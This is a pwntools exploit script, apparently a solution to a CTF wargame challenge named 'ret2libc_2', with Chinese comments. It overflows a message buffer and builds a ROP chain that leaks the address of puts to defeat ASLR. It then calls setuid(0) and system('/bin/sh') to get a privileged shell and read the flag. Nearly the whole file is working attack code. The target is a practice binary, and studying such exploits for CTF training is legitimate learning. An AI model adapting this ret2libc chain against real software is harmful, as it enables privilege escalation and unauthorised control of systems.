from pwn import *
# set 
context(arch="amd64", os="linux", log_level="debug")
# excute
challenge_path = "/challenge/ret2libc_2"
elf = ELF(challenge_path)
p = process(challenge_path)
libc= ELF('/lib/x86_64-linux-gnu/libc.so.6')
# ROPgadget --binary libc.so.6 --string '/bin/sh'
bin_sh = next(libc.search("/bin/sh"))
# bin_sh = 0x00000000001b45bd

# 程序中寻找一条pop rdi;ret指令的地址
# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" | grep "rdi"
pop_rdi_ret_addr = next(elf.search(asm('pop rdi;ret'), executable=True))
# 布置栈帧，先放入padding+rbp
payload = 6*p64(0) + p64(0) 
payload += p64(pop_rdi_ret_addr)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])
p.sendafter("Choice >> ","3\n")
p.sendafter("Input your message:\n",payload)

# 获取随机化之后的libc基地址
libc_address = u64(p.recvuntil('\n')[:-1].ljust(8, b'\x00')) - libc.sym['puts']
print("LIBC_ADDR IS",hex(libc_address))
# 继续布置新的栈帧
bin_sh_addr = libc_address + bin_sh
system_addr = libc_address + libc.sym['system']
setuid_addr = libc_address + libc.sym['setuid']
payload2 = 6*p64(0) + p64(0) 
payload2 += p64(pop_rdi_ret_addr)
payload2 += p64(0)
payload2 += p64(setuid_addr)
payload2 += p64(pop_rdi_ret_addr)
payload2 += p64(bin_sh_addr)
payload2 += p64(system_addr)
p.sendafter("Choice >> ","3\n")
p.sendafter("Input your message:\n",payload2)
# 注意获得shell之后需要进入交互模式，用改了权限的shell读取flag，不然程序终止修改失效
p.interactive()
# python3 /home/hacker/rop5.py
# leave_message中buf大小30h，但是最多可读入100h，直接控制，跟第三题一模一样，就是menu的数字4改为3